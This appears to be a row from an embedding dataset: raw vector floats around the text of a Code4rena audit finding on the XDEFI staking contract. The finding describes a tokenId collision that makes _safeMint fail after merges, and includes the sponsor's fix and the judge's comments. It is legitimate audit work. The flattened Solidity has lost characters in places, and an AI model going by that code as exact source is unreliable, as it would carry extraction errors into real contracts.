-0.0037646314594894648, 0.009673496708273888, 0.013556864112615585, 0.005276770330965519, -0.007375604473054409, -0.009680480696260929, 0.0026645767502486706, -0.011154205538332462, 0.004969453439116478, 0.0022018554154783487, 0.003024277277290821, -0.006827323231846094, -0.009897000156342983, 0.010714183561503887, -0.001581983407959342, -0.02310463972389698, 0.025912398472428322, 0.01641351357102394, 0.008192787878215313, 0.009834139607846737, 0.020436571910977364, -0.01669289357960224, -0.02128867618739605, 0.01116817444562912, -0.011433583684265614, 0.01437404751777649, -0.0029526865109801292, -0.024655193090438843, -0.023956745862960815, -0.007424496114253998, -0.00866773258894682, -0.005779652390629053, 0.005615517031401396, -0.0026663229800760746, -0.023202423006296158, 0.0009621112840250134, -0.018969831988215446, -0.04333167523145676, 0.028454747051000595, -0.03170951083302498, -0.014248327352106571, 0.007892455905675888, -0.008940126746892929, 0.017209744080901146, -0.0013375268317759037, -0.013046997599303722, -0.0310110654681921, 0.006925106048583984, -0.017363402992486954, 0.003300163894891739, 0.013046997599303722, 0.003460806794464588, 0.022406192496418953, 0.04511970281600952, 0.03631926327943802, -0.003174443496391177, 0.018955862149596214, -0.0005456620128825307, 0.014527706429362297, 0.027728362008929253, -0.006013632286339998, -0.005859973840415478, -0.032687339931726456, 0.02260175719857216, 0.010602431371808052, 0.01915142871439457, 0.010609416291117668, -0.022811291739344597, 0.0113846929743886, 0.025660958141088486, -0.03045230731368065, -0.008276601321995258, -0.034922368824481964, -0.05607135593891144, -0.029502417892217636, -0.03578844666481018, 0.009436024352908134, -0.014471829868853092, -0.04875162988901138, -0.016050321981310844, 0.02134455181658268, -0.008486135862767696, 0.013033028692007065, 0.029781797900795937, 0.02683435007929802, -0.023076701909303665, 0.008604872040450573, 0.01144056860357523, 0.02267160266637802, 0.013535910286009312, -0.01479311566799879, -0.014290234073996544, -0.016888458281755447, 0.026471156626939774, -0.02797980234026909, 0.017628813162446022, -0.01954255811870098, 0.0031971430871635675, 0.004896116442978382, 0.025772709399461746, -0.015435687266290188, -0.018187571316957474, 0.034168045967817307, -0.013535910286009312, -0.005294231232255697, -0.015379811637103558, -0.0007665459997951984, -0.01800597459077835, 0.03089931234717369, -0.0006914629484526813, -0.004616737365722656, 0.013913072645664215, -0.026596877723932266, -0.007787688635289669, -0.03302259370684624, 0.012334581464529037, 0.01550553273409605, -0.007550216279923916, -0.004312912933528423, 0.015882693231105804, 0.011866621673107147, -0.019402869045734406, 0.03022880293428898, 0.02359355427324772, -0.0025650481693446636, 0.04285673424601555, -0.005175495054572821, -0.00991096906363964, -0.01658114232122898, 0.02337004989385605, -0.0024969493970274925, -0.0354531891644001, -0.028636343777179718, 0.007892455905675888, 0.007480371743440628, 0.00867471657693386, -0.020059408619999886, -0.011929481290280819, 0.006279041990637779, -0.005385029595345259, -0.03335784748196602, 0.009023940190672874, 0.009952875785529613, 0.003673833329230547, -0.023607522249221802, 0.027518827468156815, -0.012250767089426517, 0.0005910611362196505, 0.013445112854242325, -0.01646938920021057, -0.006774940062314272, 0.0016788929933682084, -0.008060082793235779, 0.005709807388484478, 0.008737577125430107, 0.01701417937874794, -0.0289715975522995, -0.009275381453335285, 0.02595430612564087, -0.01635763794183731, -0.001386418123729527, -0.019710185006260872, 0.0004007341922260821, 0.02645718865096569, -0.014038792811334133, -0.013019059784710407, 0.01718180626630783, -0.022364286705851555, -0.0055561489425599575, -0.02261572703719139, -0.010735136456787586, -0.013808305375277996, -0.01958446577191353, 0.006670172791928053, 0.017000209540128708, 0.024669162929058075, 0.004927546251565218, 0.011049438267946243, 0.0010031451238319278, 0.002093596151098609, -0.01223679818212986, -0.008053098805248737, 0.024599317461252213, -0.025158075615763664, 0.013207640498876572, 0.0023363064974546432, -0.039476245641708374, 0.014388016425073147, -0.012606975622475147, 0.004655152093619108, 0.001069497549906373, 0.0455387718975544, -0.03956006094813347, 0.0068517690524458885, -0.0442536287009716, 0.0015418226830661297, -0.01734943315386772, -0.0051894644275307655, -0.010420835576951504, -0.010448773391544819, 0.04092901945114136, -0.004529431462287903, -0.032184455543756485, -0.010951654985547066, 0.00935919489711523, 0.00012310135934967548, 0.0017600874416530132, 0.012655867263674736, 0.026163840666413307, 0.007152101490646601, 0.006869230419397354, -0.016427483409643173, 0.0042640212923288345, 0.04682391509413719, -0.027462951838970184, 0.0011856144992634654, 0.005971725098788738, -0.0224900059401989, -0.02200109325349331, -0.0153658427298069, -0.001341019058600068, -0.0027693440206348896, -0.022909075021743774, -0.018285352736711502, 0.023914840072393417, -0.028245212510228157, -0.01570109836757183, -0.03578844666481018, 0.00595426419749856, 0.01114023569971323, 0.0016596856294199824, 0.024906635284423828, 0.02430596947669983, -0.05500971898436546, 0.029837673529982567, -0.0022647157311439514, -0.011650103144347668, 0.003806538414210081, 0.0067504942417144775, -0.030144989490509033, 0.006516514346003532, -0.011601211503148079, -0.02338401973247528, -0.016441451385617256, -0.027141666039824486, 0.046293094754219055, 0.03346959874033928, -0.01954255811870098, -0.01092371717095375, 0.016231916844844818, -0.014667395502328873, -0.0009883031016215682, -0.04227003827691078, 0.0037995539605617523, 0.0454549565911293, 0.00877948384732008, 0.015295998193323612, 0.026820380240678787, 0.0035323977936059237, 0.015589346177875996, -0.025144105777144432, 0.011887574568390846, 0.028720157220959663, -0.034168045967817307, 0.02919510193169117, -0.010763074271380901, -0.029949424788355827, -0.00323730381205678, 0.009149661287665367, 0.05453477427363396, 0.014122606255114079, 0.025493329390883446, -0.016259856522083282, -0.01487693004310131, -0.0378558486700058, 0.007913408800959587, -0.009980813600122929, -0.0014300710754469037, -0.00323730381205678, -0.03682214766740799, -0.008597887121140957, 0.024780914187431335, -0.013563849031925201, -0.01511440146714449, -0.0019119997741654515, 0.02272747829556465, -0.02188934199512005, -0.0028793495148420334, -0.013431143946945667, 0.01761484332382679, -0.014527706429362297, -0.029111288487911224, 0.021707745268940926, 0.020450539886951447, 0.00019043605425395072, 0.011999326758086681, 0.014695333316922188, -0.010637354105710983, -0.03567669168114662, 0.0156871285289526, 0.006296503357589245, -0.021470272913575172, 0.024613287299871445, 0.005524719133973122, 0.008025160990655422, -0.011419614776968956, 0.02200109325349331, 0.005622501485049725, 0.0022018554154783487, 0.001218790770508349, -0.024180248379707336, -0.08208154141902924, 0.030005300417542458, 0.007099717855453491, -0.025269826874136925, -0.02814743109047413, -0.008500104770064354, -0.009317288175225258, 0.003691294463351369, -0.013130811043083668, -0.02958623133599758, 0.007508309558033943, 0.004938023164868355, -0.017139898613095284, -0.008646778762340546, -0.03067580983042717, -0.022867167368531227, -0.017195774242281914, 0.01028813049197197, -0.01530996710062027, 0.20249387621879578, 0.01959843374788761, -0.007207977119833231, 0.03414011001586914, 0.0028706188313663006, 0.00012342874833848327, 0.007508309558033943, -0.008730592206120491, -0.017768502235412598, 0.019933689385652542, 0.010462742298841476, 0.02124677039682865, 0.013654646463692188, -0.007117179222404957, 0.006673664785921574, 0.03534143790602684, -0.02469710074365139, -0.005199940875172615, 0.00145102443639189, -0.01909555122256279, 0.025814617052674294, 0.014848992228507996, -0.0027291832957416773, -0.002044704742729664, 0.022350316867232323, -0.025423485785722733, -0.0045049856416881084, 0.004477047827094793, -0.0010371943935751915, 0.010120502673089504, -0.035145875066518784, -0.006003155373036861, -0.009624605067074299, -0.006764463149011135, -0.019724154844880104, -0.021749652922153473, 0.01067227590829134, -0.0026017166674137115, 0.023244328796863556, 0.013095889240503311, 0.036626581102609634, 0.010001766495406628, -0.0004339104634709656, -0.005056759342551231, -0.022476037964224815, 0.02376118116080761, -0.008989018388092518, -0.02156805619597435, -0.007689905818551779, 0.021582024171948433, -0.03612370043992996, -0.0063139647245407104, 0.017642781138420105, -0.006523498799651861, -0.007543231826275587, -0.008569949306547642, 0.03154188394546509, -0.000939411751460284, 0.0003280520031694323, -0.0052243866957724094, -0.03522968664765358, 0.005563133396208286, 0.0007307506166398525, 0.02349577099084854, -0.03562081605195999, 0.023202423006296158, -0.013934025540947914, 0.010092564858496189, 0.004599275998771191, -0.012879369780421257, -0.0014021331444382668, -0.02359355427324772, -0.015393780544400215, 0.0085629653185606, -0.014164512977004051, -0.012453317642211914, 0.007075272034853697, 0.00565043929964304, 0.02239222452044487, 0.003546366700902581, 0.015729036182165146, -0.0012703011743724346, 0.011517398059368134, -0.02885984629392624, -0.0026017166674137115, -0.017097992822527885, 0.004850717261433601, -0.0027780744712799788, 0.005957756191492081, 0.01561728399246931, -0.02964210882782936, -0.007022888865321875, -0.0015942062018439174, -0.013424159027636051, -0.017922161146998405, -0.0016195249045267701, 0.051014598459005356, 0.012139015831053257, -0.009903984144330025, -0.027239449322223663, -0.03391660749912262, 0.08694273233413696, 0.012830479070544243, -0.012935246340930462, -0.015016619116067886, -0.005653931759297848, -0.009980813600122929, 0.03238002210855484, -0.008947111666202545, -0.03567669168114662, -0.005255816504359245, -0.030424369499087334, -0.006202213000506163, -0.01718180626630783, 0.00396718131378293, 0.015323936007916927, 0.0061079226434230804, 0.013619724661111832, -0.008088020607829094, 0.002772836247459054, -0.0021372491028159857, -0.04011881723999977, 0.004564353730529547, 0.017307527363300323, -0.002001051791012287, -0.016329700127243996, 0.011419614776968956, 0.008088020607829094, -0.024669162929058075, -0.031150754541158676, 0.02260175719857216, -0.006453654263168573, 0.03453123942017555, -0.02869221940636635, 0.011314848437905312, -0.006027601193636656, 0.012676820158958435, -0.006893675774335861, 0.010413850657641888, 0.002112803515046835, 0.0058006057515740395, 0.00219487096183002, 0.008318508975207806, -0.016050321981310844, -0.0033944544848054647, -0.05822257697582245, 0.007829595357179642, 0.02019909955561161, -0.0007102336967363954, -0.02869221940636635, 0.006513021886348724, -0.022252533584833145, -0.01102848444133997, -0.010546555742621422, 0.0021075650583952665, -0.012669836170971394, -0.023397987708449364, -0.039001304656267166, -0.01333336066454649, 0.0019853366538882256, -0.04221416264772415, 0.03768822178244591, -0.0033455630764365196, -0.013808305375277996, -0.03925274312496185, 0.0002678109158296138, -0.17857903242111206, 0.01899776980280876, 0.014583582058548927, 0.001535711227916181, 0.015337904915213585, -0.025339672341942787, 0.002945701824501157, 0.0058669582940638065, -0.030591996386647224, -0.00016064289957284927, 0.014807084575295448, 0.016162073239684105, -0.015463626012206078, -0.03145807236433029, -0.02825918234884739, -0.005566625855863094, -0.006963520776480436, -0.013850212097167969, 0.018969831988215446, 0.01991971954703331, 0.04414187744259834, -0.028552530333399773, -0.015435687266290188, -0.014709302224218845, 0.00171119614969939, -0.01937493123114109, -0.038163166493177414, 0.005940295290201902, 0.004326881840825081, -0.00038567392039112747, -0.02964210882782936, -0.013214624486863613, 0.03291084244847298, -0.0012703011743724346, 0.003546366700902581, 0.019193334504961967, 0.020017502829432487, -0.0062371352687478065, 0.008842344395816326, 0.01018336322158575, 0.017754532396793365, 0.025772709399461746, -0.014318171888589859, 0.017307527363300323, -0.0289715975522995, 0.00700891949236393, 0.006554929073899984, -0.004208145663142204, 0.02726738713681698, -0.017028147354722023, 0.022783353924751282, -0.02112104929983616, 0.007452433928847313, 0.01767071895301342, 0.0060730003751814365, -0.003823999548330903, 0.002102326601743698, 0.011265956796705723, -0.0017417531926184893, 0.0061707827262580395, -0.012425378896296024, -0.026303529739379883, 0.02947448007762432, -0.011077376082539558, 0.0171259306371212, -0.020674042403697968, -0.013598770834505558, 0.016371607780456543, -0.031905077397823334, 0.013696553185582161, -0.03204476833343506, 0.009128707461059093, 0.0006831688806414604, 0.004050994757562876, 0.010546555742621422, 0.04503588750958443, -0.014904867857694626, -0.0015697604976594448, -0.009596667252480984, -0.021973155438899994, -0.011698993854224682, 0.03637514263391495, -0.014129591174423695, -0.0052523245103657246, -0.004850717261433601, -0.0061323679983615875, 0.015072494745254517, 0.001061640097759664, -0.003963688854128122, -0.0020289896056056023, 0.02672259695827961, -0.033497538417577744, 0.006897168233990669, 0.005828543566167355, -0.002622670028358698, 0.018648546189069748, 0.012285689823329449, 0.0186066385358572, 0.020953422412276268, -0.019053645431995392, -0.0035306515637785196, -0.020883576944470406, -0.014206420630216599, 0.009184583090245724, 0.010385912843048573, -0.019472714513540268, -0.012914292514324188, 0.011538350954651833, 0.03154188394546509, -0.030284680426120758, -0.02128867618739605, 0.006418731529265642, 0.013982917182147503, 0.03358134999871254, -0.003488744841888547, 0.008716623298823833, 0.008604872040450573, -0.01718180626630783, 0.019612403586506844, -0.0012860163114964962, 0.05495384335517883, 0.010190347209572792, -0.02299288846552372, 0.027812175452709198, 0.01550553273409605, -0.0063384100794792175, -0.08990415185689926, -0.022783353924751282, 0.006076492369174957, 0.030759623274207115, -0.035648755729198456, 0.017363402992486954, 0.007452433928847313, 0.027909958735108376, 0.004536415915936232, 0.009226489812135696, -0.022322379052639008, -0.016776707023382187, -0.0023590060882270336, 0.007396557833999395, 0.0002213205152656883, -0.0052243866957724094, 0.0024044052697718143, 0.0018019942799583077, 0.006593343336135149, 0.044644758105278015, -0.009610636159777641, -0.022098876535892487, 0.021093111485242844, -0.019053645431995392, -0.02557714469730854, 0.00417322339490056, -0.03380485624074936, 0.019612403586506844, -0.02124677039682865, 0.03779997304081917, 0.014443892054259777, 0.007613076828420162, 0.019011737778782845, -0.007487356197088957, -0.0159665085375309, -0.013549880124628544, -0.001087831798940897, -0.006841292139142752, 0.015729036182165146, -0.03704565018415451, 0.036850083619356155, 0.021693777292966843, 0.011021500453352928, 0.006907644681632519, 0.012327596545219421, 0.0025406023487448692, -0.015393780544400215, 0.004826271440833807, -0.002577270846813917, -0.011503429152071476, -0.04207447171211243, -0.012509193271398544, -0.00725686876103282, -0.012139015831053257, 0.02441772073507309, 0.0023101146798580885, 0.004050994757562876, 0.04414187744259834, -0.0221687201410532, -0.014443892054259777, 0.014751208946108818, -0.004997391253709793, -0.007015904411673546, -0.024403752759099007, 0.015058525837957859, 0.001964383292943239, -0.013040012679994106, -0.01964034140110016, 0.024878697469830513, -0.02091151475906372, -0.02029688097536564, 0.025213951244950294, -0.01630176231265068, 0.01866251416504383, -0.0431361123919487, 0.0021704253740608692, 0.005821559112519026, -0.013081920333206654, 0.015826817601919174, -0.016217948868870735, -0.026932131499052048, -0.008905204012989998, -0.013514957390725613, -0.011510413140058517, 0.021148987114429474, 0.020883576944470406, -0.004808810539543629, 0.007829595357179642, 0.02902747504413128, -0.013843227177858353, 0.0071206712163984776, 0.0003049159422516823, 0.029614169150590897, -0.032352082431316376, -0.0028426810167729855, 0.02689022570848465, -0.0020045440178364515, 0.002760613337159157, -0.007291791029274464, 0.0025248874444514513, -0.026541002094745636, 0.006429208442568779, -0.05185273662209511, 0.030871374532580376, -0.007040349766612053, -0.012690789066255093, -0.021372491493821144, -0.020185129716992378, -0.0009385386947542429, 0.005011360161006451, -0.002437581541016698, 0.0012510939268395305, -0.038721922785043716, 0.021148987114429474, 0.0003415844403207302, -0.027812175452709198, -0.01646938920021057, -0.028887784108519554, 0.013200655579566956, -0.007745781913399696, 0.013577817939221859, 0.01448579877614975, -0.007948331534862518, -0.0012161715421825647, -0.0041627464815974236, 0.02107914350926876, 0.0019870828837156296, 0.02343989536166191, -0.015337904915213585, 0.0227693859487772, 0.005678377579897642, 0.00161865190602839, 0.015980476513504982, -0.009009971283376217, -0.003041738411411643, 0.025702863931655884, -0.0014719779137521982, -0.013284469954669476, 0.02464122511446476, 0.008283586241304874, 0.038554295897483826, -0.021931247785687447, -0.019682247191667557, -0.011112297885119915, -0.022098876535892487, 0.0007844437495805323, -0.0037192325107753277, -0.017978036776185036, 0.008660747669637203, 0.005332645960152149, -0.007752766367048025, 0.012146000750362873, 0.046348970383405685, 0.0064780996181070805, -0.025870492681860924, 0.0007372985710389912, -0.01964034140110016, -0.012641898356378078, 0.006771447602659464, -0.0032233346719294786, -0.003617957467213273, -0.02228047139942646, 0.03204476833343506, -0.022587789222598076, 0.023509738966822624, -0.02503235451877117, 0.020185129716992378, -0.008653763681650162, -0.04461682215332985, 0.02151218056678772, 0.012278705835342407, -0.0053885215893387794, -0.017754532396793365, -0.0017059578094631433, -0.0025353641249239445, -0.01051163300871849, 0.004410695284605026, -0.003872890956699848, 0.006188244093209505, 0.015058525837957859, -0.028608405962586403, 0.008555980399250984, 0.009401101619005203, -0.030117051675915718, 0.0016876235604286194, 0.021917279809713364, 0.0017714372370392084, 0.014862961135804653, 0.0050812046974897385, 0.0135848019272089, -0.03050818294286728, 0.015072494745254517, -0.036458954215049744, 0.013899103738367558, -0.0016771468799561262, 0.0001797410805011168, -0.0028112507425248623, 0.021875372156500816, 0.0011175158433616161, 0.0017068308079615235, 0.034056294709444046, -0.013459081761538982, 0.02321639098227024, 0.01727958954870701, 0.0006408254848793149, -0.021358521655201912, 0.020185129716992378, 0.013556864112615585, -0.03852635994553566, -0.05327756702899933, 0.01894189417362213, -0.011489460244774818, 0.02233634889125824, 0.007113686762750149, 0.014988681301474571, 0.024878697469830513, -0.0189279243350029, 0.0021634409204125404, 0.00940808653831482, -0.002584255300462246, -0.004361804109066725, 0.024948541074991226, 0.023635460063815117, 0.019794000312685966, 0.00866773258894682, -0.02359355427324772, 0.033888667821884155, -0.014890898950397968, 0.021651869639754295, -0.010043674148619175, -0.0038833676371723413, -0.005825051572173834, 0.0156452227383852, 0.022783353924751282, -0.02267160266637802, -0.012502208352088928, 0.004180207848548889, 0.00787848699837923, -0.0025091723073273897, 0.002772836247459054, 0.005510750226676464, 0.04984120652079582, 0.02891572192311287, -0.005839020479470491, 0.0014073714846745133, 0.008514073677361012, 0.010930702090263367, -0.001302604447118938, 0.011098328977823257, 0.012132031843066216, -0.017363402992486954, 0.019794000312685966, 0.004351327195763588, -0.012641898356378078, 0.000911473878659308, -0.012502208352088928, 0.0017653257818892598, -0.0159665085375309, 0.01012748759239912, -0.026582907885313034, -0.023188453167676926, 0.005982202012091875, 0.025479361414909363, 0.025227921083569527, 0.015575377270579338, -0.025213951244950294, -0.002558063715696335, 0.04408600181341171, 0.0016212710179388523, -0.02700197696685791, -0.01511440146714449, 0.0016020637704059482, 0.00491357734426856, -0.014904867857694626, -0.01442992314696312, 0.0018578701419755816, -0.006390793714672327, -0.010504649020731449, 0.004868178628385067, 0.00109743548091501, 0.005371060688048601, -0.028776032850146294, 0.03933655843138695, -0.016776707023382187, -0.03506205976009369, 0.020185129716992378, 0.004113855306059122, -0.02908335067331791, -0.006715571973472834, -0.02480885200202465]"
"Medium Severity

[M-01]

  _safeMint  Will Fail Due To An Edge Case In Calculating  tokenId  Using The  _generateNewTokenId  Function

NFTs are used to represent unique positions referenced by the generated `tokenId`. The `tokenId` value contains the position's score in the upper 128 bits and the index wrt. the token supply in the lower 128 bits.When positions are unlocked after expiring, the relevant position stored in the `positionOf` mapping is deleted, however, the NFT is not. The `merge()` function is used to combine points in unlocked NFTs, burning the underlying NFTs upon merging. As a result, `_generateNewTokenId()` may end up using the same `totalSupply()` value, causing `_safeMint()` to fail if the same `amount_` and `duration_` values are used.This edge case only occurs if there is an overlap in the `points_` and `totalSupply() + 1` values used to generate `tokenId`. As a result, this may impact a user's overall experience while interacting with the `XDEFI` protocol, as some transactions may fail unexpectedly.```solidityfunction _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, ""INVALID_AMOUNT"");    // Get bonus multiplier and check that it is not zero (which validates the duration).    uint8 bonusMultiplier = bonusMultiplierOf[duration_];    require(bonusMultiplier != uint8(0), ""INVALID_DURATION"");    // Mint a locked staked position NFT to the destination.    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));    // Track deposits.    totalDepositedXDEFI += amount_;    // Create Position.    uint96 units = uint96((amount_ * uint256(bonusMultiplier)) / uint256(100));    totalUnits += units;    positionOf[tokenId_] =        Position({            units: units,            depositedXDEFI: uint88(amount_),            expiry: uint32(block.timestamp + duration_),            created: uint32(block.timestamp),            bonusMultiplier: bonusMultiplier,            pointsCorrection: -_toInt256Safe(_pointsPerUnit * units)        });    emit LockPositionCreated(tokenId_, destination_, amount_, duration_);}``````solidityfunction _generateNewTokenId(uint256 points_) internal view returns (uint256 tokenId_) {    // Points is capped at 128 bits (max supply of XDEFI for 10 years locked), total supply of NFTs is capped at 128 bits.    return (points_ << uint256(128)) + uint128(totalSupply() + 1);}``````solidityfunction merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) {    uint256 count = tokenIds_length;    require(count  uint256(1), ""MIN_2_TO_MERGE"");    uint256 points;    // For each NFT, check that it belongs to the caller, burn it, and accumulate the points.    for (uint256 i; i < count; ++i) {        uint256 tokenId = tokenIds_[i];        require(ownerOf(tokenId) == msg.sender, ""NOT_OWNER"");        require(positionOf[tokenId].expiry == uint32(0), ""POSITION_NOT_UNLOCKED"");        _burn(tokenId);        points += _getPointsFromTokenId(tokenId);    }    // Mine a new NFT to the destinations, based on the accumulated points.    _safeMint(destination_, tokenId_ = _generateNewTokenId(points));}```Consider replacing `totalSupply()` in `_generateNewTokenId()` with an internal counter. This should ensure that `_generateNewTokenId()` always returns a unique `tokenId` that is monotomically increasing .[deluca-mike (XDEFI) confirmed(https://github.com/code-423n4/2022-01-xdefi-findings/issues/17#issuecomment-1012535766): In the release candidate contract, `_generateNewTokenId` now used an internal `_tokensMinted` variable(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L36) instead of `totalSupply()`, as seen here(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L393).[Ivshti (Judge) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/17#issuecomment-1013783639): Agreed with sponsor  As for mitigation, the new way to generate token IDs seems cleaner, but more gas consuming","[0.0026947888545691967, -0.006020310800522566, -0.03342176228761673, -0.027284516021609306, -0.031097261235117912, 0.025399403646588326, -0.06786403059959412, 0.0016468154499307275, -0.0206795372068882, -0.016413230448961258, 0.045582860708236694, 0.022933168336749077, 0.0027054192032665014, -0.009546036832034588, -0.009567297995090485, 0.01897868514060974, 0.023528466001152992, -0.01104137022048235, 0.017391221597790718, -0.00486869178712368, -0.024293849244713783, 0.013450912199914455, -0.03356349840760231, -0.007069170009344816, 0.004602933302521706, 0.008029443211853504, 0.021203966811299324, -0.02452063001692295, -0.010949240997433662, 0.013132002204656601, 0.032344553619623184, -0.0009004776366055012, -0.027001040056347847, -0.01773139275610447, -0.010538201779127121, -0.009262561798095703, 0.0021012621000409126, -0.030105097219347954, -0.0022979232016950846, -0.04243628308176994, 0.030020054429769516, 0.02551279403269291, 0.006831759586930275, 0.004964364692568779, 0.019177116453647614, 0.018624339252710342, -0.0059707025066018105, -0.002739081857725978, -0.010042119771242142, 0.02116144634783268, 0.021118924021720886, 0.027723902836441994, -0.00914917141199112, 0.02410959079861641, -0.011218542233109474, -0.019432244822382927, 0.025115929543972015, 0.006562457885593176, -0.006275438703596592, 0.01233827043324709, 0.0024626932572573423, -0.0006453496753238142, -0.008029443211853504, 0.015038374811410904, 0.003883614204823971, 0.005499424412846565, -0.008468830026686192, 0.014542292803525925, -0.02670339122414589, -0.01892198994755745, 0.030388573184609413, 0.0029180259443819523, 0.011998100206255913, 0.0005948556354269385, -0.0034194232430309057, 0.015576978214085102, 0.003247566055506468, -0.013762734830379486, 0.0336201936006546, -0.015137591399252415, 0.02592383325099945, 0.02313159964978695, -0.009623993188142776, 0.05060037598013878, 0.011232716031372547, -0.00285601569339633, 0.013500520028173923, 0.007774315308779478, -0.00024184002541005611, -0.001272982102818787, 0.012848527170717716, 0.0044009569101035595, 0.021076403558254242, -0.023386728018522263, -0.024222981184720993, 0.003376901848241687, -0.017603827640414238, 0.0025530511047691107, 0.005074211396276951, -0.004833257291465998, -0.00904286839067936, 0.014868289232254028, -0.017561307176947594, -0.01661166362464428, -0.012912308797240257, -0.018893642351031303, -0.006920345593243837, 0.0038623535074293613, 0.0074057974852621555, 0.005407295189797878, -0.01296900399029255, 0.02839007042348385, -0.023840289562940598, -0.01267844159156084, 0.005205318797379732, 0.0005005114362575114, 0.04365522786974907, -0.00963816698640585, -0.016795923933386803, -0.022040219977498055, 0.04254967346787453, 0.016129756346344948, -0.009035781025886536, -0.02789398841559887, 0.021969350054860115, -0.008610568009316921, 0.005435642786324024, -0.007090430706739426, -0.03118230402469635, -0.026306526735424995, 0.05232957750558853, 0.013606823980808258, 0.015860453248023987, 0.01296900399029255, -0.00231386860832572, 0.022720560431480408, -0.034442272037267685, -0.020637016743421555, -0.025115929543972015, -0.02789398841559887, 0.010857111774384975, 0.03299654647707939, 0.007944400422275066, 0.017490437254309654, -0.004397413693368435, 0.0024981277529150248, 0.0016902226489037275, 0.008022356778383255, 0.010949240997433662, -0.02381194196641445, -0.01530767697840929, -0.012012274004518986, -0.0021278378553688526, 0.015180112794041634, -0.012614659033715725, 0.016087234020233154, -0.013592650182545185, -0.027426254004240036, -0.02094883844256401, -0.011587060987949371, -0.006923888809978962, 0.00178235222119838, 0.011856362223625183, -0.017362874001264572, 0.03812745213508606, 0.03529269993305206, -0.009659427218139172, -0.009057042188942432, -0.0022270544432103634, 0.02158665843307972, 0.01293356902897358, 0.009546036832034588, -0.007703446317464113, 0.027525469660758972, 0.010424811393022537, 0.05028855428099632, 0.0084121348336339, -0.00914917141199112, 0.010970501229166985, -0.016583316028118134, -0.006718369200825691, 0.014669856987893581, 0.031635865569114685, 0.046631719917058945, -0.01223196741193533, 0.009446821175515652, 0.032628029584884644, 0.025810442864894867, -0.005042320117354393, -0.0025920290499925613, 0.027695555239915848, 0.023996200412511826, -0.02979327365756035, -0.012394965626299381, -0.587361216545105, -0.03126734867691994, -0.0024396609514951706, -0.00373124610632658, -0.0063923723064363, 0.0008185355109162629, 0.01668253354728222, 0.02950979955494404, -0.0220685675740242, 0.04793570563197136, -0.004528521094471216, 0.010254725813865662, 0.015052548609673977, -0.022252826020121574, 0.012139838188886642, -0.002716049551963806, -0.0007662696880288422, -0.01800069399178028, 0.01461316179484129, 0.0041174814105033875, -0.031097261235117912, 0.013075307011604309, -0.0016778205754235387, 0.014939158223569393, -0.01883694715797901, -0.008801913820207119, 0.014322599396109581, 0.009283822029829025, -0.0004196766240056604, 0.012494182214140892, -0.024690715596079826, -0.010991762392222881, -0.0020551972556859255, -0.018666861578822136, 0.048445962369441986, -0.011742972768843174, -0.007668012287467718, 0.006647500209510326, -0.0032032730523496866, 0.012458748184144497, -0.01730617880821228, -0.005074211396276951, 0.04666006565093994, -0.029112933203577995, 0.030813785269856453, 0.004865148104727268, 0.02501671202480793, -0.013309174217283726, 0.007894792594015598, -0.033535152673721313, -0.0161155816167593, 0.0062258304096758366, 0.009418473578989506, 0.02564035914838314, -0.022153610363602638, -0.008312919177114964, 0.02768138237297535, 0.006059288512915373, 0.01870938204228878, -0.011721711605787277, -0.007370362989604473, 0.008816087618470192, -0.03041692078113556, 0.004223784897476435, -0.018468428403139114, -0.006371111609041691, 0.006991214584559202, 0.008532612584531307, 0.02444976195693016, -0.02634904719889164, -0.008121572434902191, 0.03526435047388077, -0.010134248994290829, -0.0011418747017160058, 0.02304655686020851, 0.005205318797379732, 0.015010027214884758, -0.008426308631896973, 0.00693451939150691, 0.041926026344299316, 0.02894284762442112, -0.016484100371599197, -0.009659427218139172, 0.0013748561032116413, 0.013762734830379486, 0.008192441426217556, 0.012210707180202007, -0.03274141997098923, 0.013358782976865768, 0.007005387917160988, 0.010013772174715996, 0.011119326576590538, 0.006048658397048712, -0.0392613559961319, 0.02082127518951893, 0.007767228409647942, -0.009709035977721214, -0.0016335275722667575, -0.0017920966492965817, -0.04008343443274498, -0.026660870760679245, 0.016101408749818802, 0.015038374811410904, -0.0020020457450300455, 0.039970044046640396, 0.03146577998995781, 0.003267055144533515, -0.009836599230766296, 0.03560452163219452, -0.01492498442530632, -0.028064073994755745, -0.0009930500527843833, -0.012699701823294163, 0.0030207857489585876, -0.011409888975322247, -0.030246835201978683, 0.023585161194205284, 0.005662423092871904, -0.005180514417588711, 0.005626988597214222, 0.043343402445316315, 0.014726552180945873, 0.02032519318163395, -0.005276187788695097, 0.00984368659555912, -0.007859357632696629, 0.011218542233109474, -0.027653034776449203, 0.02262134477496147, -0.0005137993139214814, 0.00865308940410614, 0.0029180259443819523, 0.041869331151247025, 0.0008149920613504946, 0.008128659799695015, 0.019573982805013657, -0.008206615224480629, 0.009553124196827412, 0.018383385613560677, -0.01289104763418436, 0.009446821175515652, -0.012607572600245476, 0.010283073410391808, -0.010835850611329079, -0.011579973623156548, -0.014584814198315144, -0.009269648231565952, -0.01778808794915676, 0.00670773908495903, -0.002159728901460767, -0.027653034776449203, 0.0021260662470012903, 0.0013394217239692807, 0.003251109505072236, -0.01492498442530632, -0.005067124497145414, 0.019035380333662033, -0.030927175655961037, -0.0003414993698243052, -0.010495680384337902, -0.008603481575846672, 0.03634155914187431, -0.02011258713901043, -0.030048402026295662, -0.03427218645811081, -0.028460940346121788, -0.006891997996717691, 0.007632577791810036, -0.010325594805181026, -0.04654667526483536, -0.02290482074022293, -0.018936162814497948, 0.009404299780726433, -0.013110741972923279, 0.0018549927044659853, 0.028078246861696243, -0.02542775124311447, -0.002556594554334879, -0.017065225169062614, 0.01212566439062357, 0.0018408190226182342, 0.009694862179458141, -0.027695555239915848, 0.004213154315948486, 0.017830608412623405, 0.0052407532930374146, 0.010410637594759464, 0.023769419640302658, 0.009836599230766296, 0.0462348535656929, -0.014811594970524311, -0.01982911117374897, -0.007717620115727186, -0.013231218792498112, -0.010913806967437267, 0.01926215924322605, -0.0013677692040801048, -0.019460592418909073, -0.00890113040804863, 0.017830608412623405, 